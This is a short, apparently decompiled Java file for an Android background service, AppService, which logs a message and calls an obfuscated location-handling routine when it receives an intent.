package com.network.android.android.monitor;

import android.app.IntentService;
import android.content.Intent;
import com.network.android.c.a.a;

public class AppService extends IntentService {
    public AppService() {
        super("AppService");
    }

    /* access modifiers changed from: protected */
    public final void onHandleIntent(Intent intent) {
        a.a("Location doWakefulWork : ");
        com.network.location.a.f(getApplicationContext());
    }
}
